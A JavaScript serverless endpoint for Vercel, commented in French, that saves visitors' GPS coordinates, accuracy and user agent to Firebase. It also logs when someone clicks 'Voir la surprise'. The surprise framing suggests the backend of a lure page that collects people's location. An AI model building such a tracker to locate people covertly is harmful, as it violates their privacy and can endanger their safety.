/**
 * ============================================================
 *  VERCEL SERVERLESS — POST /api/save
 *  Enregistre une position ou une "Vue" dans Firebase
 * ============================================================
 */

const { db, collection, addDoc } = require("../lib/firebase");

module.exports = async (req, res) => {
  // ── Headers CORS ──
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") { return res.status(204).end(); }
  if (req.method !== "POST") { return res.status(405).json({ success: false, message: "Méthode non autorisée." }); }

  try {
    if (!db) { throw new Error("Firebase non configuré dans les variables d'environnement."); }

    const { type, latitude, longitude, accuracy, timestamp } = req.body || {};
    
    // ── NOUVEAU : Gérer le clic sur "Voir la surprise" ──
    if (type === "view") {
      const entry = {
        type: "view",
        dateReceived: new Date().toISOString(),
        userAgent: req.headers["user-agent"] || "Inconnu",
      };
      const docRef = await addDoc(collection(db, "positions"), entry);
      entry.id = docRef.id;
      console.log(`[Vercel Firestore] Surprise VUE, id=${docRef.id}`);
      return res.status(200).json({ success: true, message: "Vue de la surprise enregistrée.", entry });
    }

    // ── Gérer la position géographique ──
    if (latitude === undefined || longitude === undefined) {
      return res.status(400).json({ success: false, message: "latitude et longitude sont requis." });
    }

    const entry = {
      type: "location",
      latitude: parseFloat(latitude),
      longitude: parseFloat(longitude),
      accuracy: accuracy !== undefined ? parseFloat(accuracy) : null,
      timestamp: timestamp || Date.now(),
      dateReceived: new Date().toISOString(),
      userAgent: req.headers["user-agent"] || "Inconnu",
    };

    const docRef = await addDoc(collection(db, "positions"), entry);
    entry.id = docRef.id;

    console.log(`[Vercel Firestore] Position sauvegardée, id=${docRef.id}`);
    
    return res.status(200).json({
      success: true,
      message: "Position enregistrée dans la base en ligne.",
      entry,
    });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ success: false, message: err.message });
  }
};
